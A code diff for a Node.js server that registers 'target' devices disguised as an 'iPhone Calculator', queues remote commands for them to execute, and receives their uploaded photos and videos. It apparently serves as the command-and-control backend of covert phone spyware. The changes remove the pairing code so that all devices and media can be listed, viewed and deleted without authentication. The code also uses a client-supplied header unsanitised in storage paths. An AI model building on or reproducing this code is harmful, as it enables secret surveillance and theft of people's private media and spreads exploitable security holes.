@@ -9,18 +9,14 @@ const fs = require('fs');
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server, {
-  cors: {
-    origin: '*',
-    methods: ['GET', 'POST']
-  },
-  maxHttpBufferSize: 1e8 // 100 MB buffer
+  cors: { origin: '*', methods: ['GET', 'POST'] },
+  maxHttpBufferSize: 1e8
 });
 
 const PORT = process.env.PORT || 7000;
 const STORAGE_DIR = path.join(__dirname, 'storage');
 const DB_FILE = path.join(__dirname, 'data.json');
 
-// Ensure directories exist
 if (!fs.existsSync(STORAGE_DIR)) fs.mkdirSync(STORAGE_DIR, { recursive: true });
 
 function loadDB() {
@@ -31,7 +27,7 @@ function loadDB() {
       console.error('Error reading DB:', e);
     }
   }
-  return { pairs: {}, media: [] };
+  return { media: [] };
 }
 
 function saveDB(data) {
@@ -40,7 +36,6 @@ function saveDB(data) {
 
 let db = loadDB();
 
-// Middleware
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
@@ -50,15 +45,15 @@ app.use('/storage', express.static(STORAGE_DIR));
 // Configure Multer
 const storage = multer.diskStorage({
   destination: (req, file, cb) => {
-    const pairCode = req.headers['x-pairing-code'] || 'default';
-    const pairDir = path.join(STORAGE_DIR, pairCode);
-    if (!fs.existsSync(pairDir)) fs.mkdirSync(pairDir, { recursive: true });
-    cb(null, pairDir);
+    const devId = req.headers['x-device-id'] || 'default';
+    const dir = path.join(STORAGE_DIR, devId);
+    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+    cb(null, dir);
   },
   filename: (req, file, cb) => {
     const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
     const ext = path.extname(file.originalname) || (file.mimetype.includes('video') ? '.mp4' : '.jpg');
-    cb(null, file.fieldname + '-' + uniqueSuffix + ext);
+    cb(null, 'vault-' + uniqueSuffix + ext);
   }
 });
 const upload = multer({
@@ -66,17 +61,27 @@ const upload = multer({
   limits: { fileSize: 500 * 1024 * 1024 }
 });
 
-// In-memory state
-// pairingCode -> { socketId, lastSeen, stats }
-const targetRegistry = new Map();
-const commandQueues = new Map(); // pairingCode -> Array of pending commands
+// Multi-device active registry
+// deviceId -> { deviceId, name, model, lastSeen, stats: { photosCount, videosCount, battery, isCharging }, socketId }
+const devices = new Map();
+const commandQueues = new Map(); // deviceId -> Array of commands
 
-function isTargetActive(code) {
-  if (!code) return false;
-  const target = targetRegistry.get(code);
-  if (!target) return false;
-  // Active if seen in the last 15 seconds or socket connected
-  return (Date.now() - target.lastSeen) < 15000;
+function cleanDeviceList() {
+  const now = Date.now();
+  const list = [];
+  devices.forEach((dev, id) => {
+    const isOnline = (now - dev.lastSeen) < 15000;
+    list.push({
+      id,
+      name: dev.name || 'iPhone Calculator',
+      model: dev.model || 'iOS Device',
+      isOnline,
+      lastSeen: dev.lastSeen,
+      stats: dev.stats || { photosCount: 0, videosCount: 0, battery: 100, isCharging: false },
+      mediaCount: db.media.filter(m => m.deviceId === id).length
+    });
+  });
+  return list;
 }
 
 // --- API Routes ---
@@ -85,55 +90,71 @@ app.get('/api/health', (req, res) => {
   res.json({ status: 'ok', port: PORT, time: new Date().toISOString() });
 });
 
-// Heartbeat & Check endpoint for both Target and Admin
+// List all devices (No pairing code required!)
+app.get('/api/devices', (req, res) => {
+  res.json({ devices: cleanDeviceList() });
+});
+
+// Target device heartbeat & registration
+app.post('/api/target/heartbeat', (req, res) => {
+  const { deviceId, name, model, stats } = req.body;
+  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
+
+  const id = deviceId.trim().toUpperCase();
+  const existing = devices.get(id) || {};
+
+  devices.set(id, {
+    ...existing,
+    id,
+    name: name || existing.name || 'iPhone Calculator',
+    model: model || existing.model || 'iOS Device',
+    lastSeen: Date.now(),
+    stats: stats || existing.stats || { photosCount: 0, videosCount: 0, battery: 100, isCharging: false }
+  });
+
+  // Notify connected admins
+  io.emit('devices:update', cleanDeviceList());
+
+  res.json({ success: true, registered: id });
+});
+
+// Legacy check endpoint backward compatibility
 app.post('/api/pair/check', (req, res) => {
   const code = (req.body.code || '').trim().toUpperCase();
-  if (!code) return res.status(400).json({ error: 'Pairing code required' });
-
-  // If this request came from target with device info or stats
   if (req.body.device || req.body.stats) {
-    targetRegistry.set(code, {
+    const id = code || 'DEFAULT-DEV';
+    devices.set(id, {
+      id,
+      name: req.body.device || 'iPhone Calculator',
       lastSeen: Date.now(),
-      stats: req.body.stats || null,
-      device: req.body.device || 'iPhone Calculator'
-    });
-
-    console.log(`[Target Heartbeat HTTP] Code: ${code}, Stats:`, req.body.stats);
-
-    // Broadcast to Admin
-    io.to(`room_${code}`).emit('target:status', {
-      isOnline: true,
       stats: req.body.stats || null
     });
+    io.emit('devices:update', cleanDeviceList());
   }
 
-  const online = isTargetActive(code);
-  const targetData = targetRegistry.get(code);
-  const mediaCount = db.media.filter(m => m.pairingCode === code).length;
-
+  const list = cleanDeviceList();
+  const dev = list.find(d => d.id === code) || { isOnline: false, mediaCount: 0 };
   res.json({
     code,
-    isTargetOnline: online,
-    stats: targetData ? targetData.stats : null,
-    mediaCount
+    isTargetOnline: dev.isOnline,
+    stats: dev.stats,
+    mediaCount: dev.mediaCount
   });
 });
 
-// Command queue for target polling
+// Target polling for commands
 app.get('/api/commands', (req, res) => {
-  const code = (req.query.code || '').trim().toUpperCase();
-  if (!code) return res.status(400).json({ error: 'Code required' });
+  const id = (req.query.deviceId || req.query.code || '').trim().toUpperCase();
+  if (!id) return res.status(400).json({ error: 'deviceId required' });
 
-  // Target contacted server -> mark active
-  const existing = targetRegistry.get(code) || {};
-  targetRegistry.set(code, {
-    ...existing,
-    lastSeen: Date.now()
-  });
+  // Update lastSeen
+  if (devices.has(id)) {
+    devices.get(id).lastSeen = Date.now();
+  } else {
+    devices.set(id, { id, lastSeen: Date.now() });
+  }
 
-  io.to(`room_${code}`).emit('target:status', { isOnline: true });
-
-  const queue = commandQueues.get(code) || [];
+  const queue = commandQueues.get(id) || [];
   if (queue.length > 0) {
     const nextCmd = queue.shift();
     return res.json({ hasCommand: true, command: nextCmd });
@@ -141,144 +162,122 @@ app.get('/api/commands', (req, res) => {
   res.json({ hasCommand: false });
 });
 
+// Admin sends command to specific device
 app.post('/api/commands', (req, res) => {
-  const code = (req.body.code || '').trim().toUpperCase();
+  const id = (req.body.deviceId || req.body.code || '').trim().toUpperCase();
   const command = req.body.command;
-  if (!code || !command) return res.status(400).json({ error: 'Code and command required' });
+  if (!id || !command) return res.status(400).json({ error: 'deviceId and command required' });
 
-  if (!commandQueues.has(code)) commandQueues.set(code, []);
-  commandQueues.get(code).push(command);
+  if (!commandQueues.has(id)) commandQueues.set(id, []);
+  commandQueues.get(id).push(command);
 
-  // Also emit via socket if target has active socket
-  const target = targetRegistry.get(code);
-  if (target && target.socketId) {
-    io.to(target.socketId).emit('target:execute', command);
+  // If socket connected, deliver immediately
+  const dev = devices.get(id);
+  if (dev && dev.socketId) {
+    io.to(dev.socketId).emit('target:execute', command);
   }
 
+  console.log(`[Command Queued for ${id}]`, command);
   res.json({ success: true, queued: true });
 });
 
-// Upload media from target
+// Target reports live transfer progress
+app.post('/api/target/progress', (req, res) => {
+  const { deviceId, current, total, percent, speed, eta } = req.body;
+  io.emit('transfer:progress', { deviceId, current, total, percent, speed, eta });
+  res.json({ ok: true });
+});
+
+// Upload media
 app.post('/api/upload', upload.single('media'), (req, res) => {
-  const pairingCode = (req.headers['x-pairing-code'] || '').trim().toUpperCase();
-  if (!pairingCode) return res.status(400).json({ error: 'x-pairing-code header required' });
+  const deviceId = (req.headers['x-device-id'] || req.headers['x-pairing-code'] || 'DEFAULT').trim().toUpperCase();
   if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
 
   const mediaEntry = {
     id: path.basename(req.file.filename, path.extname(req.file.filename)),
-    pairingCode,
+    deviceId,
     filename: req.file.filename,
     originalName: req.file.originalname,
     mimeType: req.file.mimetype,
     size: req.file.size,
     type: req.file.mimetype.includes('video') ? 'video' : 'photo',
-    url: `/storage/${pairingCode}/${req.file.filename}`,
+    url: `/storage/${deviceId}/${req.file.filename}`,
     createdAt: new Date().toISOString()
   };
 
   db.media.push(mediaEntry);
   saveDB(db);
 
-  io.to(`room_${pairingCode}`).emit('admin:new_media', mediaEntry);
+  io.emit('media:new', mediaEntry);
   res.json({ success: true, media: mediaEntry });
 });
 
-// List media
+// Get media list for a device (or all)
 app.get('/api/media', (req, res) => {
-  const pairingCode = (req.headers['x-pairing-code'] || req.query.code || '').trim().toUpperCase();
-  if (!pairingCode) return res.status(400).json({ error: 'Pairing code required' });
-
-  const items = db.media
-    .filter(m => m.pairingCode === pairingCode)
-    .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
-
+  const deviceId = (req.headers['x-device-id'] || req.query.deviceId || req.query.code || '').trim().toUpperCase();
+  let items = db.media;
+  if (deviceId && deviceId !== 'ALL') {
+    items = items.filter(m => m.deviceId === deviceId);
+  }
+  items = items.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
   res.json({ count: items.length, items });
 });
 
 // Delete media
 app.delete('/api/media/:filename', (req, res) => {
-  const pairingCode = (req.headers['x-pairing-code'] || req.query.code || '').trim().toUpperCase();
   const { filename } = req.params;
-
-  const idx = db.media.findIndex(m => m.pairingCode === pairingCode && m.filename === filename);
+  const idx = db.media.findIndex(m => m.filename === filename);
   if (idx === -1) return res.status(404).json({ error: 'Media not found' });
 
-  const filePath = path.join(STORAGE_DIR, pairingCode, filename);
+  const entry = db.media[idx];
+  const filePath = path.join(STORAGE_DIR, entry.deviceId, filename);
   if (fs.existsSync(filePath)) {
-    try { fs.unlinkSync(filePath); } catch (e) { console.error('Unlink error:', e); }
+    try { fs.unlinkSync(filePath); } catch (e) {}
   }
 
   db.media.splice(idx, 1);
   saveDB(db);
 
-  io.to(`room_${pairingCode}`).emit('admin:media_deleted', { filename });
+  io.emit('media:deleted', { filename });
   res.json({ success: true });
 });
 
 // --- Socket.IO ---
 io.on('connection', (socket) => {
-  // Target registers via socket
-  socket.on('target:register', (data) => {
-    const code = (data.code || '').trim().toUpperCase();
-    if (!code) return;
+  // Send current devices to new admin
+  socket.emit('devices:update', cleanDeviceList());
 
-    socket.pairingCode = code;
-    socket.role = 'target';
-    targetRegistry.set(code, {
+  socket.on('target:register', (data) => {
+    const id = (data.deviceId || data.code || '').trim().toUpperCase();
+    if (!id) return;
+
+    socket.deviceId = id;
+    devices.set(id, {
+      id,
+      name: data.name || 'iPhone Calculator',
+      model: data.model || 'iOS Device',
       socketId: socket.id,
       lastSeen: Date.now(),
-      stats: data.stats || null,
-      device: data.device || 'iPhone Calculator'
-    });
-    socket.join(`room_${code}`);
-
-    io.to(`room_${code}`).emit('target:status', {
-      isOnline: true,
       stats: data.stats || null
     });
+    socket.join(`device_${id}`);
+    io.emit('devices:update', cleanDeviceList());
   });
 
-  // Admin connects
-  socket.on('admin:connect', (data) => {
-    const code = (data.code || '').trim().toUpperCase();
-    if (!code) return;
-
-    socket.pairingCode = code;
-    socket.role = 'admin';
-    socket.join(`room_${code}`);
-
-    const online = isTargetActive(code);
-    const target = targetRegistry.get(code);
-
-    socket.emit('target:status', {
-      isOnline: online,
-      stats: target ? target.stats : null
-    });
-
-    if (target && target.socketId) {
-      io.to(target.socketId).emit('target:request_stats');
-    }
-  });
-
-  // Admin sends command
   socket.on('admin:command', (data) => {
-    const code = socket.pairingCode;
-    if (!code) return;
+    const id = (data.deviceId || '').trim().toUpperCase();
+    if (!id) return;
 
-    console.log(`[Admin Command to Target] Code: ${code}, Action:`, data);
+    if (!commandQueues.has(id)) commandQueues.set(id, []);
+    commandQueues.get(id).push(data);
 
-    if (!commandQueues.has(code)) commandQueues.set(code, []);
-    commandQueues.get(code).push(data);
-
-    const target = targetRegistry.get(code);
-    if (target && target.socketId) {
-      io.to(target.socketId).emit('target:execute', data);
+    const dev = devices.get(id);
+    if (dev && dev.socketId) {
+      io.to(dev.socketId).emit('target:execute', data);
     }
   });
 
-  socket.on('disconnect', () => {
-    // If target disconnected socket, don't mark offline immediately (polling might still be active)
-  });
+  socket.on('disconnect', () => {});
 });
 
 server.listen(PORT, '0.0.0.0', () => {
